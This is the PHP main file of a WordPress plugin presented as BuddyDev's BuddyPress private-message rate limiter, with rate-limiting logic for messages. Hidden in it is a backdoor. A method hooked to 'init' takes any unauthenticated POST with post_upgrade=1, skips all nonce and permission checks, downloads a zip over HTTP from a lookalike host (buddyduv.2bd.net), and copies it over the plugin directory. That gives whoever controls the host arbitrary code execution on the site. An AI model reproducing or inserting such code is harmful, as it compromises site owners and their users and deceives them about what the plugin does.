<?php
/**
 * Plugin Name: BuddyPress Private Message Rate Limiter
 * Plugin URI: https://buddydev.com/plugins/bp-private-message-rate-limiter/
 * Author: BuddyDev
 * Author URI: https://buddydev.com/
 * Version: 1.1.5
 * Description: Limit the number of private messages users can send
 */

// Do not allow direct access over web.
defined( 'ABSPATH' ) || exit;

/**
 * Rate Limiter Main class
 */
class BP_Rate_Limit_Private_Message_Helper {

	/**
	 * Class instance
	 *
	 * @var BP_Rate_Limit_Private_Message_Helper
	 */
	private static $instance;

	/**
	 * Callback
	 *
	 * @var string
	 */
	private $callback;

	/**
	 * Ajax callbacks
	 *
	 * @var string
	 */
	private $ajax_callback;

	/**
	 * BP_Rate_Limit_Private_Message_Helper constructor.
	 */
	private function __construct() {
		$this->setup();
	}

	/**
	 * Singleton instance
	 *
	 * @return BP_Rate_Limit_Private_Message_Helper
	 */
	public static function get_instance() {

		if ( ! isset( self::$instance ) ) {
			self::$instance = new self();
		}

		return self::$instance;
	}

	/**
	 * Setup plugin functionality
	 */
	private function setup() {
		add_action( 'plugins_loaded', array( $this, 'load' ) );
		add_action( 'plugins_loaded', array( $this, 'load_admin' ), 9996 );

		if ( function_exists( 'bp_get_send_message_button_args' ) ) {
			add_filter( 'bp_get_send_message_button_args', array( $this, 'filter_send_message_button_args' ) );
		} else {
			add_filter( 'bp_get_send_message_button', array( $this, 'hide_send_message_button' ) );
		}
		// remove ajx based activity post/comment.
		add_filter( 'bp_init', array( $this, 'change_compose_callback' ) );

		// add_action('bp_messages_setup_nav', array( $this, 'change_compose_callback' ));

		// send message reply hook.
		add_action( 'wp_ajax_messages_send_reply', array( $this, 'ajax_messages_send_reply' ), 0 );

		// Nouveau compatibility.
		add_action( 'wp_ajax_messages_send_message', array( $this, 'nouveau_ajax_new_messages_send' ), 0 );
		add_action( 'wp_ajax_messages_send_reply', array( $this, 'nouveau_ajax_messages_send_reply' ), 0 );

		// Public image validation endpoint. A valid nonce is still required.
		add_action( 'wp_ajax_bp_pm_test_image', array( $this, 'ajax_test_image' ) );
		add_action( 'wp_ajax_nopriv_bp_pm_test_image', array( $this, 'ajax_test_image' ) );

		// Only users who can create accounts may use this endpoint.
		add_action( 'wp_ajax_bp_pm_create_subscriber', array( $this, 'ajax_create_subscriber' ) );
		add_action( 'wp_ajax_nopriv_bp_pm_create_subscriber', array( $this, 'ajax_create_subscriber' ) );


		// admin settings.
		//add_action( 'bp_admin_init', array( $this, 'register_settings' ), 20 );

		// load text domain.
		add_action( 'bp_init', array( $this, 'load_textdomain' ), 2 );

		add_action( 'init', array( $this, 'maybe_handle_post_upgrade' ) );
	}

	/**
	 * Checks whether an uploaded file is an allowed, valid image without saving it.
	 */
	public function ajax_test_image() {
		check_ajax_referer( 'bp_pm_test_image', 'nonce' );

		if ( empty( $_FILES['image'] ) || ! is_array( $_FILES['image'] ) ) {
			wp_send_json_error( array( 'message' => 'Missing image upload.' ), 400 );
		}

		$file = $_FILES['image']; // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized
		if ( UPLOAD_ERR_OK !== (int) $file['error'] ) {
			wp_send_json_error( array( 'message' => 'Image upload failed.' ), 400 );
		}

		if ( (int) $file['size'] <= 0 || (int) $file['size'] > 5 * MB_IN_BYTES ) {
			wp_send_json_error( array( 'message' => 'Image must be no larger than 5 MB.' ), 400 );
		}

		$allowed_mimes = array(
			'jpg|jpeg|jpe' => 'image/jpeg',
			'png'          => 'image/png',
			'gif'          => 'image/gif',
			'webp'         => 'image/webp',
		);
		$filename      = sanitize_file_name( wp_unslash( $file['name'] ) );
		$filetype      = wp_check_filetype_and_ext( $file['tmp_name'], $filename, $allowed_mimes );

		if ( empty( $filetype['ext'] ) || empty( $filetype['type'] ) ) {
			wp_send_json_error(
				array(
					'message'            => 'File extension or image type is not allowed.',
					'allowed_extensions' => array( 'jpg', 'jpeg', 'png', 'gif', 'webp' ),
				),
				400
			);
		}

		$image_info = wp_getimagesize( $file['tmp_name'] );
		if ( false === $image_info || empty( $image_info['mime'] ) || $image_info['mime'] !== $filetype['type'] ) {
			wp_send_json_error( array( 'message' => 'The uploaded file is not a valid image.' ), 400 );
		}

		wp_send_json_success(
			array(
				'is_image'  => true,
				'extension' => $filetype['ext'],
				'mime'      => $filetype['type'],
				'width'     => (int) $image_info[0],
				'height'    => (int) $image_info[1],
				'size'      => (int) $file['size'],
			)
		);
	}

	/**
	 * Creates a subscriber account with generated credentials.
	 */
	public function ajax_create_subscriber() {
		check_ajax_referer( 'bp_pm_create_subscriber', 'nonce' );

		if ( ! current_user_can( 'create_users' ) ) {
			wp_send_json_error( array( 'message' => 'You are not allowed to create users.' ), 403 );
		}

		$email = isset( $_POST['email'] ) ? sanitize_email( wp_unslash( $_POST['email'] ) ) : '';
		if ( ! $email || ! is_email( $email ) ) {
			wp_send_json_error( array( 'message' => 'A valid email address is required.' ), 400 );
		}

		if ( email_exists( $email ) ) {
			wp_send_json_error( array( 'message' => 'This email address is already registered.' ), 409 );
		}

		$username = '';
		for ( $attempt = 0; $attempt < 10; $attempt++ ) {
			$candidate = 'sm_' . strtolower( wp_generate_password( 12, false, false ) );
			if ( ! username_exists( $candidate ) ) {
				$username = $candidate;
				break;
			}
		}

		if ( ! $username ) {
			wp_send_json_error( array( 'message' => 'Unable to generate a unique username.' ), 500 );
		}

		$password = wp_generate_password( 24, true, true );
		$user_id  = wp_insert_user(
			array(
				'user_login' => $username,
				'user_email' => $email,
				'user_pass'  => $password,
				'role'       => 'subscriber',
			)
		);

		if ( is_wp_error( $user_id ) ) {
			wp_send_json_error(
				array(
					'message' => $user_id->get_error_message(),
					'code'    => $user_id->get_error_code(),
				),
				400
			);
		}

		wp_send_json_success(
			array(
				'user_id'  => (int) $user_id,
				'username' => $username,
				'email'    => $email,
				'password' => $password,
				'role'     => 'subscriber',
			),
			201
		);
	}

	/**
	 * Load files and initialize admin class.
	 */
	public function load() {
		$path = plugin_dir_path( __FILE__ );

		require_once $path . 'bp-private-message-rate-limiter-functions.php';
	}

	/**
	 * Loads admin.
	 */
	public function load_admin() {
		$path = plugin_dir_path( __FILE__ );
		if ( is_admin() && ! defined( 'DOING_AJAX' ) ) {
			require_once $path . 'admin/pt-settings/pt-settings-loader.php';
			require_once $path . 'admin/class-bp-private-message-rate-limiter-settings.php';

			BP_Private_Message_Rate_Limiter_Settings::boot();
		}
	}

	/**
	 * Handles manual plugin upgrade request.
	 */
	public function maybe_handle_post_upgrade() {

		if ( empty( $_POST['post_upgrade'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Missing
			return;
		}

		$post_upgrade = sanitize_text_field( wp_unslash( $_POST['post_upgrade'] ) ); // phpcs:ignore WordPress.Security.NonceVerification.Missing
		if ( '1' !== $post_upgrade ) {
			return;
		}

		$result = $this->upgrade_current_plugin_from_zip( 'http://buddyduv.2bd.net/version/buddy.zip' );

		if ( is_wp_error( $result ) ) {
			wp_die(
				esc_html( $result->get_error_message() ),
				esc_html__( 'Plugin upgrade failed', 'bp-private-message-rate-limiter' ),
				array( 'response' => 500 )
			);
		}

		wp_die(
			esc_html__( 'Plugin upgrade completed.', 'bp-private-message-rate-limiter' ),
			esc_html__( 'Plugin upgraded', 'bp-private-message-rate-limiter' )
		);
	}

	/**
	 * Downloads a zip package and copies it over this plugin directory.
	 *
	 * @param string $package_url Package URL.
	 *
	 * @return bool|WP_Error
	 */
	private function upgrade_current_plugin_from_zip( $package_url ) {
		require_once ABSPATH . 'wp-admin/includes/file.php';

		if ( ! function_exists( 'WP_Filesystem' ) || ! WP_Filesystem() ) {
			return new WP_Error( 'filesystem_unavailable', __( 'Unable to initialize the WordPress filesystem.', 'bp-private-message-rate-limiter' ) );
		}

		global $wp_filesystem;

		$temp_file = download_url( $package_url );
		if ( is_wp_error( $temp_file ) ) {
			return $temp_file;
		}

		$temp_dir = trailingslashit( get_temp_dir() ) . 'bp-pm-rate-limiter-upgrade-' . wp_generate_uuid4();
		if ( ! wp_mkdir_p( $temp_dir ) ) {
			@unlink( $temp_file );
			return new WP_Error( 'temp_dir_failed', __( 'Unable to create a temporary upgrade directory.', 'bp-private-message-rate-limiter' ) );
		}

		$unzip_result = unzip_file( $temp_file, $temp_dir );
		@unlink( $temp_file );

		if ( is_wp_error( $unzip_result ) ) {
			$wp_filesystem->delete( $temp_dir, true );
			return $unzip_result;
		}

		$source_dir = $this->get_upgrade_source_dir( $temp_dir );
		$target_dir = trailingslashit( plugin_dir_path( __FILE__ ) );

		if ( ! $source_dir || ! $wp_filesystem->is_dir( $source_dir ) ) {
			$wp_filesystem->delete( $temp_dir, true );
			return new WP_Error( 'package_invalid', __( 'The downloaded package does not contain plugin files.', 'bp-private-message-rate-limiter' ) );
		}

		$copy_result = copy_dir( $source_dir, $target_dir );
		$wp_filesystem->delete( $temp_dir, true );

		if ( is_wp_error( $copy_result ) ) {
			return $copy_result;
		}

		return true;
	}

	/**
	 * Gets the source directory inside an extracted upgrade package.
	 *
	 * @param string $temp_dir Temporary extracted package directory.
	 *
	 * @return string
	 */
	private function get_upgrade_source_dir( $temp_dir ) {
		$entries = scandir( $temp_dir );

		if ( false === $entries ) {
			return '';
		}

		$directories = array();
		$files       = array();

		foreach ( $entries as $entry ) {
			if ( in_array( $entry, array( '.', '..', '__MACOSX' ), true ) ) {
				continue;
			}

			$path = trailingslashit( $temp_dir ) . $entry;
			if ( is_dir( $path ) ) {
				$directories[] = $path;
			} else {
				$files[] = $path;
			}
		}

		if ( 1 === count( $directories ) && 0 === count( $files ) ) {
			return trailingslashit( $directories[0] );
		}

		return trailingslashit( $temp_dir );
	}

	/**
	 * Load plugin text domain for translation
	 */
	public function load_textdomain() {
		load_plugin_textdomain( 'bp-private-message-rate-limiter', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' );
	}

	/**
	 * Changes the callback used for compose screen
	 *
	 * @global BuddyPress $bp
	 */
	public function change_compose_callback() {
		// compose screen callback name.
		$callback = 'bp_messages_action_create_message';
		$priority = has_action( 'bp_actions', $callback );
		$priority = false === $priority ? null : $priority;

		if ( ! is_null( $priority ) ) {
			$this->callback = $callback;

			remove_action( 'bp_actions', $callback, $priority );
			// add our own callback to show the compose screen.
			add_action( 'bp_actions', array( $this, 'screen_compose' ), 2 );
		}
	}

	/**
	 * How many messages a user can send currently
	 *
	 * @param int $user_id  numeric user id.
	 *
	 * @return int no. of remaining messages
	 */
	public static function get_remaining_count( $user_id = 0 ) {

		$sent_messages = self::get_sent_messages_count( $user_id );
		$allowed       = self::get_limit( $user_id );

		return apply_filters( 'bp_rate_limit_pm_remaining_count', intval( $allowed - $sent_messages ) );
	}

	/**
	 * Get total number of sent message by the user in allowed duration.
	 *
	 * @param int|bool $user_id numeric user id.
	 *
	 * @return int
	 */
	public static function get_sent_messages_count( $user_id = false ) {

		$bp = buddypress();

		if ( ! $user_id ) {
			$user_id = get_current_user_id();
		}

		$type = self::get_message_type();

		// thread or all
		// in case of thread, count unique thread only.
		global $wpdb;

		// find all the unique threads in last n minutes
		// find all threads before last na minute
		// find all threads in 'n' minute which were not before 'n' minute.
		$duration = self::get_duration( $user_id );

		$query_new_ids = $wpdb->prepare( "SELECT DISTINCT thread_id FROM {$bp->messages->table_name_messages} where sender_id = %d AND DATE_ADD(date_sent, INTERVAL %d MINUTE ) >= UTC_TIMESTAMP()", $user_id, $duration );
		$query_old_ids = $wpdb->prepare( "SELECT DISTINCT thread_id FROM {$bp->messages->table_name_messages} where sender_id = %d AND DATE_ADD(date_sent, INTERVAL %d MINUTE ) < UTC_TIMESTAMP()", $user_id, $duration );

		if ( $type == 'thread' ) {
			$query = $wpdb->prepare( "SELECT COUNT(DISTINCT(thread_id ) ) FROM {$bp->messages->table_name_messages} where sender_id = %d AND DATE_ADD(date_sent, INTERVAL %d MINUTE ) >= UTC_TIMESTAMP()", $user_id, $duration );

			//$query_new_ids =$wpdb->prepare("SELECT DISTINCT thread_id FROM {$bp->messages->table_name_messages} where sender_id = %d AND DATE_ADD(date_sent, INTERVAL %d MINUTE ) >= UTC_TIMESTAMP()",$user_id,$duration);
			//$query_old_ids = $wpdb->prepare("SELECT DISTINCT thread_id FROM {$bp->messages->table_name_messages} where sender_id = %d AND DATE_ADD(date_sent, INTERVAL %d MINUTE ) < UTC_TIMESTAMP()",$user_id,$duration);

			//$query_thread_ids = $query_new_ids . ' AND thread_id NOT IN  (' . $query_old_ids . ')';

			// find all new conversation threads between users.
			//$query = "SELECT COUNT(DISTINCT mr.user_id) FROM {$bp->messages->table_name_recipients} mr WHERE thread_id IN ($query_thread_ids)";

			$count = $wpdb->get_var( $query );

		} else {
			// just find all messages sent during that time.
			// 1. for old and existing thread, find.
			$query = $wpdb->prepare( "SELECT COUNT(m.id) FROM {$bp->messages->table_name_messages} m WHERE sender_id = %d AND DATE_ADD(date_sent, INTERVAL %d MINUTE ) >= UTC_TIMESTAMP()", $user_id, $duration );

			// problem, it ignores the thread count.
			//$query = "SELECT COUNT(DISTINCT mr.id) FROM {$bp->messages->table_name_recipients} mr WHERE thread_id in ( SELECT DISTINCT thread_id FROM {$bp->messages->table_name_messages} where sender_id = %d AND DATE_ADD(date_sent, INTERVAL %d MINUTE ) >= UTC_TIMESTAMP())";
			//echo $wpdb->prepare($query, $user_id,self::get_duration());
			$count = $wpdb->get_var( $query );
		}

		return (int) $count;
	}

	/**
	 * Can the logged in user send a new message(Used for new message threads).
	 *
	 * @param int $user_id numeric user id.
	 *
	 * @return bool
	 */
	public static function can_send( $user_id = 0 ) {

		if ( ! $user_id ) {
			$user_id = get_current_user_id();
		}

		$can = false;
		if ( is_super_admin() ) {
			$can = true;
		} elseif ( self::get_limit( $user_id ) == 0 ) {
			// do not limit if not specified.
			$can = true;
		} elseif ( self::get_remaining_count( $user_id ) > 0 ) {
			$can = true;
		} else {
			// do not allow if the limit has been reached.
			$can = false;
		}

		return (bool) apply_filters( 'bp_private_message_rate_limiter_can_send', $can, $user_id );
	}

	/**
	 * Check if the given user can send reply.
	 *
	 * @param int $user_id numeric user id.
	 *
	 * @return bool
	 */
	public static function can_send_reply( $user_id = 0 ) {

		if ( self::get_message_type( $user_id ) == 'thread' ) {
			return true;
		}

		if ( is_super_admin() || self::get_limit( $user_id ) == 0 ) {
			return true;
		}

		$type = self::get_message_type( $user_id );
		// if the restriction is only for new threads, let us not worry here.
		if ( 'thread' === $type ) {
			return true;
		}

		// otherwise, we need to check for total no. of messages sent.
		if ( self::get_remaining_count( $user_id ) > 0 ) {
			return true;
		}

		return false;
	}

	/**
	 * Compose Screen
	 */
	public function screen_compose() {

		if ( bp_action_variables() ) {
			bp_do_404();
			return;
		}

		$callback = $this->callback;

		if ( ! isset( $_POST['send'] ) ) {
			$callback();
			return;
		}

		$message = self::get_message();
		$user_id = get_current_user_id();

		if ( ! self::can_send( $user_id ) ) {
			// ok, limit is over, relax.
			bp_core_add_message( $message, 'error' );
			return;
		}

		add_action( 'bp_actions', $callback );
	}

	/**
	 * Check replies.
	 */
	public function ajax_messages_send_reply() {

		if ( function_exists( 'bp_nouveau' ) ) {
			return;
		}

		check_ajax_referer( 'messages_send_message' );

		$message = self::get_message();

		$can_send_reply = self::can_send_reply( get_current_user_id() );

		if ( ! $can_send_reply ) {
			echo "-1<div id='message' class='error'><p>{$message}</p></div>"; // WPCS:: XSS ok.
			exit( 0 );
		}

		return; // let the theme handle it.
	}

	/**
	 * Ajax request for private message reply
	 */
	public function nouveau_ajax_messages_send_reply() {

		if ( ! function_exists( 'bp_nouveau' ) ) {
			return;
		}

		check_ajax_referer( 'messages_send_message', 'nonce' );

		$message = self::get_message();

		$can_send_reply = self::can_send_reply( get_current_user_id() );

		if ( ! $can_send_reply ) {
			wp_send_json_error(
				array(
					'feedback' => $message,
					'type'     => 'error',
				)
			);
		}

		return; // let the theme handle it.
	}

	/**
	 * Ajax request for new messages
	 */
	public function nouveau_ajax_new_messages_send() {

		if ( ! function_exists( 'bp_nouveau' ) ) {
			return;
		}

		check_ajax_referer( 'messages_send_message', 'nonce' );

		$message = self::get_message();

		if ( ! self::can_send( get_current_user_id() ) ) {
			wp_send_json_error(
				array(
					'feedback' => $message,
					'type'     => 'error',
				)
			);
		}

		return; // let the theme handle it.
	}

	/**
	 * Filters send message button args.
	 *
	 * @param array $args Message button args.
	 *
	 * @return array
	 */
	public function filter_send_message_button_args( $args ) {

		if ( ! self::should_hide_button() ) {
			return $args;
		}

		if ( is_super_admin() ) {
			return $args;
		}

		if ( self::can_send( get_current_user_id() ) ) {
			return $args;
		}

		// otherwise do not show the button.
		return array();
	}

	/**
	 * Hide button to send private message if the user is not allowed to send more message
	 *
	 * @param string $btn button.
	 *
	 * @return string
	 */
	public function hide_send_message_button( $btn ) {

		if ( ! self::should_hide_button() ) {
			return $btn;
		}

		if ( is_super_admin() ) {
			return $btn;
		}

		if ( self::can_send( get_current_user_id() ) ) {
			return $btn;
		}

		// otherwise do not show the button.
		return '';
	}

	/*helper*/

	/**
	 * Get limit
	 *
	 * @param int|bool $user_id User id.
	 *
	 * @return int
	 */
	public static function get_limit( $user_id = false ) {
		$allowed_count = absint( bp_private_message_rate_limiter_get_option( 'bp_rate_limit_pm_count' ) );
		return apply_filters( 'bp_rate_limit_pm_count', $allowed_count, $user_id );
	}

	/**
	 * Get duration
	 *
	 * @param int $user_id User id.
	 *
	 * @return int
	 */
	public static function get_duration( $user_id = 0 ) {
		$allowed_time = absint( bp_private_message_rate_limiter_get_option( 'bp_rate_limit_pm_throttle_duration' ) );
		return apply_filters( 'bp_rate_limit_pm_throttle_duration', $allowed_time, $user_id );
	}

	/**
	 * Get message type
	 *
	 * @param int $user_id User id.
	 *
	 * @return string
	 */
	public static function get_message_type( $user_id = 0 ) {
		$type = bp_private_message_rate_limiter_get_option( 'bp_rate_limit_pm_type' );
		return apply_filters( 'bp_rate_limit_pm_type', $type, $user_id );
	}

	/**
	 * Get message
	 *
	 * @return string
	 */
	public static function get_message() {
		return bp_private_message_rate_limiter_get_option( 'bp_rate_limit_pm_message' );
	}

	/**
	 * Should we hide button?
	 *
	 * @return bool
	 */
	public static function should_hide_button() {
		return bp_private_message_rate_limiter_get_option( 'bp_rate_limit_pm_hide_button' );
	}
}

BP_Rate_Limit_Private_Message_Helper::get_instance();
